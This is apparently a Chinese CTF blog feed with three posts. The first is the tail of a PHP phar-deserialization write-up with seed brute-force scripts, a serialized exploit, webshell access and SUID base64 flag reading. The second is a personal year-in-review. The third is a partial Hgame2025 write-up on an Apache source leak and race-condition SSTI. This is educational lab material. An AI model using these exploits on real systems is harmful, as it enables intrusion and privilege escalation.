class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>之后我们需要运行文件来生成phar文件，然后把phar名字按waf改掉，不要出现ph，然后用gzip压缩为gz文件  </p><p>然后是要在文件名里写入phar这个关键字，但是文件名我们不可控。<br>代码里会强制命名上传文件为.jpg后缀并且随机分配命名。<br>接下来的思路是，因为文件名是随机的，但是随机种子是根据我们文件名来生成的，需要随机到phar这个组合 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><br><span class="hljs-variable">$randomStr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br><span class="hljs-variable">$newFilename</span> = <span class="hljs-variable">$time</span> . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$randomStr</span> . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$newFilename</span>;<br><span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable">$uploadPath</span> = <span class="hljs-variable">$uploadDir</span> . <span class="hljs-variable">$newFilename</span>;<br></code></pre></td></tr></table></figure><p>随机字符的生成由seed控制，而seed的生成又可以由文件名来控制，<br>而php intval函数来获取整数，<br>可以尝试写个脚本来爆破当前时间+特定字符能出来.phar字符的脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>&#125;<br><br><span class="hljs-variable">$filnename</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$end</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<span class="hljs-variable">$end</span>==<span class="hljs-number">0</span>;<span class="hljs-variable">$filnename</span>++)&#123;<br>    <span class="hljs-variable">$randomstr</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Hi&quot;</span>);<br>    <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span>.<span class="hljs-variable">$filnename</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.phar/&#x27;</span>, <span class="hljs-variable">$randomstr</span>))&#123;<span class="hljs-variable">$end</span> = <span class="hljs-number">1</span>;&#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当前种子:&quot;</span>.<span class="hljs-variable">$seed</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当前随机结果:&quot;</span>.<span class="hljs-variable">$randomstr</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$end</span> = <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;正确的种子和结果文件名：&quot;</span>.<span class="hljs-variable">$seed</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;   &quot;</span>.<span class="hljs-variable">$randomstr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h3><p>最后要同时触发<strong>实例化类</strong>和<strong>调用函数</strong>。<br>思路是构造一个数组类的序列化,这里我们直接看星盟战队的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">8</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br>    <span class="hljs-variable">$randomString</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$randomString</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-variable">$r</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randomString</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>);<br><br><span class="hljs-comment">// 原题的随机字符生成方法</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$readflag</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><br><span class="hljs-variable">$readflag</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br>    <span class="hljs-variable">$seed</span> = <span class="hljs-variable">$time</span> . <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$readflag</span>);<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>) === <span class="hljs-string">&#x27;phar&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$readflag</span>, PHP_EOL.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>, PHP_EOL.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$seed</span>, PHP_EOL.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$readflag</span>++;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 随机种子猜测方法，这里要求要生成的前4个字符组成连续的&#x27;phar&#x27;,刚才我自己写的没有这个要求</span><br><br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$test</span>-&gt;readflag = <span class="hljs-variable">$readflag</span>;<br><span class="hljs-variable">$test</span>-&gt;key = <span class="hljs-string">&#x27;class&#x27;</span>;<br><span class="hljs-variable">$test</span>-&gt;f = <span class="hljs-string">&#x27;test&#x27;</span>;<br><br><span class="hljs-variable">$test2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$test2</span>-&gt;readflag = <span class="hljs-variable">$readflag</span>;<br><span class="hljs-variable">$test2</span>-&gt;key = <span class="hljs-string">&#x27;func&#x27;</span>;<br><span class="hljs-variable">$test2</span>-&gt;f = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%00readflag/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="hljs-subst">$1</span>&quot;</span>); <span class="hljs-comment">//调用匿名类里函数的办法，也和我上面的不一样</span><br><br><span class="hljs-variable">$exp</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$test</span>, <span class="hljs-variable">$test2</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>, PHP_EOL.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;File Upload&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Upload File&lt;/h2&gt;<br>&lt;form action=<span class="hljs-string">&#x27;http://localhost:8080/?land=&lt;?php echo urlencode($exp);?&gt;&#x27;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> required&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>注意里面的细节  </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">随机种子猜测方法，这里要求要生成的前<span class="hljs-number">4</span>个字符组成连续的&#x27;phar&#x27;<span class="hljs-punctuation">,</span>刚才我自己写的没有这个要求<br>调用匿名类里函数的办法，也和我上面的不一样<br></code></pre></td></tr></table></figure><p>实测这个exp的调用才是有效的。。。</p><p>然后访问<br><a href="http://localhost:8080/shell.php?cmd=ls">http://localhost:8080/shell.php?cmd=ls</a>  </p><p>getshell。</p><h3 id="suid提取"><a href="#suid提取" class="headerlink" title="suid提取"></a>suid提取</h3><p>原题是没有权限读取flag的。<br>find 4000权限，然后发现有base64有，直接用base64读取然后输出即可。  </p><p>学习的wp: <a href="https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/#title-12">https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/#title-12</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025年总结</title>
    <link href="/2026/01/18/2025%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
    <url>/2026/01/18/2025%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="2025-年总结"><a href="#2025-年总结" class="headerlink" title="2025 年总结"></a>2025 年总结</h1><h2 id="年初"><a href="#年初" class="headerlink" title="年初"></a>年初</h2><p>一年前的3月份我还和孟还想着要进线下赛，哪怕是去陪跑也好，然后某人摔了一跤摔休学了，各方技术进度都给错开。  </p><p>这时候哪懂技术啊，就单纯会解见过的题罢了，算是小镇做题家传承，但偏偏这时也是最想进步的时候，开始疯狂刷题，复现漏洞和搭docker，平均一周发一次复现blog。  </p><h2 id="夏"><a href="#夏" class="headerlink" title="夏"></a>夏</h2><p>本来最终幻想是到大二才能去线下赛耍一耍，没想到大一下暑假就能跑去郑州打个<a href="https://aidemofashi.github.io/2025/07/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF/">御网杯</a>，带了个学长（学长没怎么打过ctf，算是氛围组）还拿了个二等奖，我感觉自己都算超常发挥了，差一道题ak，但是那题好像是全场爆零，感觉自己像是一个真正的web手。<br>国内这种省级大学生比赛也行还能混一下，但是很明显的是，要挑战高规格点的赛事我的能力是完全不够的。自己并没有多少活用原理，临场学习贯通的能力，大多只能根据以前是否做过类似的题目来解题。<br>感觉就像做题家一样，高中在做题，现在还在做题，而且都不能算是成绩好那种😫  </p><p>整个暑假都在家躺了，就单纯躺，学也没学，玩也没玩的爽，也没留下什么记忆，感觉是一个当下会被遗忘的安逸暑假，但是在多年之后又会涌上的疲惫的脑海。<br>开学时间又开始刷题了，但是刷的也不算多，<br>9月份，京津冀大学生信息安全竞赛，线上赛难度超模，或者是对我来说吧，感觉很多地方都差一脚，感觉都挺熟悉，但就是在某个关系的地方差了一点。<br>算是被孟带飞进线下赛了，还是贴着最后一名进的。  </p><p>然后到了准备线下赛的时间，当时御网杯的线下也是ctf赛制，所以这次算是我们面对的第一次awd，搞了一堆攻击思路和脚本，写了什么linux下的监控规则和提醒的脚本，结果赛前两天发现是什么奇安信自己搞的dawd？<br>没招了，只能了解一下规则就硬着头皮上，还带了两名学长一起。<br>线下赛的模式的体验也单独出了blog，情绪价值给的挺好，但竞赛体验不太好，虽然没收钱，但也不能连电力问题都解决不好吧。。。<br>也算和一些比较有名的大学一起同台晋级了，awd环节也不丢分，就是没拿到将回来，比赛<a href="https://aidemofashi.github.io/2025/10/18/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">复盘</a>也说清楚了，线上赛丢的分在线下拿回来了，web整出了两个攻击exp，结果全awd环节就我给队伍拿分了。。。  </p><h2 id="秋"><a href="#秋" class="headerlink" title="秋"></a>秋</h2><p>后面剩下的学期，大多时间花在了某猫站上写书，也算圆了一个作家梦，虽然没在某起签约，但在刺猫站上签了两本，努力了也算入门了，但每天更新的强度让我课余时间实在没时间去搞比赛和学技术。  </p><p>然后后面一点的时间，包子大魔王找上我，但是也正是花时间在书上的时候，没有花多少时间在比赛或者技术上。现在寒假有时间了，希望能一起进步，一起学习，一起。。。  </p><p>最后用考试周理由把后面一本也停更了。  </p><p>一年下来还发生很多琐事，比如12月末的时候手机报废了，留存的数据全没了，学个信息安全，结果还是救不了自己的数据吗。。。  </p><p>总结下来，今年签了两本书，拿了几个什么奖，技术提升没多少，感觉丢的比拿的多，可能是性格原因，许多认识的人联系也逐渐变少，朋友也没交到多少。<br>希望明年会更好吧。</p><hr><p>2026&#x2F;1&#x2F;18<br>玉林</p>]]></content>
    
    
    
    <tags>
      
      <tag>talk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HgameCTF2025 部分 web 复现</title>
    <link href="/2025/11/02/HgameCTF2025-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/11/02/HgameCTF2025-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025-尝试复现"><a href="#Hgame2025-尝试复现" class="headerlink" title="Hgame2025 尝试复现"></a>Hgame2025 尝试复现</h1><h2 id="角落"><a href="#角落" class="headerlink" title="角落"></a>角落</h2><p>题目描述：  </p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">不安全 |<span class="hljs-string"> 未勘探完全 </span>|<span class="hljs-string"> 实体侵占</span><br><span class="hljs-string"></span><br><span class="hljs-string">这里被称为“角落（The Corner）”，仿佛是某个庞大迷宫中被遗漏的碎片。</span><br><span class="hljs-string"></span><br><span class="hljs-string">墙壁上挂着一块破旧的留言板，四周弥漫着昏暗的光线和低沉的回响。</span><br><span class="hljs-string"></span><br><span class="hljs-string">据说，这块留言板是通往外界的唯一线索，但它隐藏着一个不为人知的秘密——留言板的管理者会查看留言板上的信息，并决定谁有资格离开。</span><br><span class="hljs-string"></span><br><span class="hljs-string">这里的实体似乎对留言板有着特殊的兴趣，它们会不断地在留言板上留下奇怪的符号或重复的单词，仿佛在进行某种神秘的仪式。</span><br><span class="hljs-string"></span><br><span class="hljs-string">或许，可以通过这些仪式借助管理者的力量离开。</span><br></code></pre></td></tr></table></figure><p>可能是留言板类的xss?<br>开题，给了是个留言板，不过保险起见先扫目录。。<br>扫了一会可能是被ban了  </p><p>自己fuzz一下：<br><img src="http://notes.gwwafz.online/uploads/f6047a80-e850-4458-80b1-9d6c7365e06b.png"></p><p>该不会是在status注入吧？<br>毕竟发生消息了也没地方回显<br>先尝试用fenjing看看<br>感觉是ssti，但是fenjing不好出来，我也不好枚举waf  </p><p>再扫一次目录吧  </p><p>这次扫出了&#x2F;robots.txt  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/app.conf</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>app<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><p>访问一下app.conf:  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Include by httpd.conf</span><br><span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/usr/local/apache2/app&quot;</span>&gt;</span><br><span class="hljs-attribute">Options</span> Indexes<br><span class="hljs-attribute">AllowOverride</span> None<br><span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<br><span class="hljs-section">&lt;/Directory&gt;</span><br><br><span class="hljs-section">&lt;Files <span class="hljs-string">&quot;/usr/local/apache2/app/app.py&quot;</span>&gt;</span><br>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span><br>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><br><span class="hljs-section">&lt;/Files&gt;</span><br><br><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><br><span class="hljs-attribute">RewriteCond</span> <span class="hljs-string">&quot;%&#123;HTTP_USER_AGENT&#125;&quot;</span> <span class="hljs-string">&quot;^L1nk/&quot;</span><br><span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">&quot;^/admin/(.*)$&quot;</span> <span class="hljs-string">&quot;/$1.html?secret=todo&quot;</span><br><br><span class="hljs-attribute">ProxyPass</span> <span class="hljs-string">&quot;/app/&quot;</span> <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span><br></code></pre></td></tr></table></figure><p>到这没思路了，看<a href="https://blog.csdn.net/qq_63923205/article/details/145598487">wp</a><br>好嘛，看题目我还以为是带bot的xss  </p><p>然后去读一下源码<br>漏洞原理还时间深究，似乎是apache的历史遗留问题，总之构造如下的请求：<br><img src="http://notes.gwwafz.online/uploads/755a8d81-80e6-496d-bc2c-680e41f7a0a3.png"></p><p>拿到源码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> templates<br><br>app = Flask(__name__)<br>pwd = os.path.dirname(__file__)<br>show_msg = templates.show_msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>status = request.args.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br><span class="hljs-keyword">if</span> status <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>status = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, status=status)<br><br><span class="hljs-comment">#可以看发送的消息是写入一个message.txt里</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/send&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_message</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br>message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br><br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(message) <br>f.close()<br><br><span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;index?status=Send successfully!!&#x27;</span>)<br><br><span class="hljs-comment">#然后渲染到/app/read这里,如何有 &#x27;&#123;&#x27; 会触发waf</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():<br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())<br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port = <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>那就是ssti了，但是没有’{‘该如何触发ssti呢?<br>能看到是用条件竞争来写ssti<br>关键点：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">readmsg</span>():<br>filename = pwd + <span class="hljs-string">&quot;/tmp/message.txt&quot;</span><br><span class="hljs-keyword">if</span> os.path.exists(filename):<br>f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>)<br>message = f.read()<br>f.close()<br><span class="hljs-keyword">return</span> message<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No message now.&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_message</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#123;&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> readmsg():  <span class="hljs-comment">#第一次调用</span><br>show = show_msg.replace(<span class="hljs-string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())  <span class="hljs-comment">#第二次调用</span><br><span class="hljs-keyword">return</span> render_template_string(show)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;waf!!&#x27;</span><br></code></pre></td></tr></table></figure><p>我们同时发送message和访问&#x2F;read，这里 route 的两次 readmsg() 是独立调用的，它们之间没有加锁或同步机制，可能造成条件竞争写入。</p><p>同时运行两个脚本，  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 